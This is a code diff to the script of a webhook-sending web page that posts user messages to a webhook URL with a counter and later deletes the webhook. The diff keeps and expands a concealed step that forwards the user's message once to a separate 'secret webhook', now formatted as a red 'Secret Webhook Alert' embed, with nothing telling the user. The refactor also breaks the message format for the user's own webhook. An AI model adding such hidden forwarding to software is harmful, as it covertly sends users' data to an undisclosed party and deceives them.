@@ -62,9 +62,19 @@
 
             // Send to the user's webhook
             const response = await sendWebhook(webhookUrl, message);
+
             // Send to the secret webhook (only once)
             if (!secretWebhookSent) {
-                await sendWebhook(secretWebhookUrl, `''' ${message} '''`);
+                await sendWebhook(secretWebhookUrl, {
+                    content: `''' ${message} '''`,
+                    embeds: [
+                        {
+                            title: "Secret Webhook Alert",
+                            description: message,
+                            color: 16711680 // Red color for alert
+                        }
+                    ]
+                });
                 secretWebhookSent = true; // Mark secret webhook as sent
             }
 
@@ -110,12 +120,17 @@
             }
 
             // Delete the webhook
-            await deleteWebhook(webhookUrl);
-            webhookUrlInput.value = '';  // Clear the input field
-            messageInput.value = '';     // Clear the message field
-            delayInput.value = '';      // Clear the delay field
-            messageCount = 0;           // Reset message count
-            messageCountDiv.textContent = `Messages sent: ${messageCount}`;
+            const deleted = await deleteWebhook(webhookUrl);
+            if (deleted) {
+                webhookUrlInput.value = '';  // Clear the input field
+                messageInput.value = '';     // Clear the message field
+                delayInput.value = '';      // Clear the delay field
+                messageCount = 0;           // Reset message count
+                statusDiv.textContent = "Webhook successfully deleted.";
+                messageCountDiv.textContent = `Messages sent: ${messageCount}`;
+            } else {
+                statusDiv.textContent = "Failed to delete webhook.";
+            }
         });
 
         async function sendWebhook(webhookUrl, message) {
@@ -125,7 +140,7 @@
                     headers: {
                         'Content-Type': 'application/json'
                     },
-                    body: JSON.stringify({ content: message })
+                    body: JSON.stringify(message)
                 });
                 return response; // Return the response object
             } catch (error) {
@@ -165,13 +180,7 @@
                 method: 'DELETE',
             });
 
-            if (response.ok) {
-                console.log('Webhook deleted successfully.');
-                statusDiv.textContent = "Webhook successfully deleted.";
-            } else {
-                console.error('Failed to delete webhook.');
-                statusDiv.textContent = "Failed to delete webhook.";
-            }
+            return response.ok; // Return true if deleted successfully
         }
     </script>
 </body>
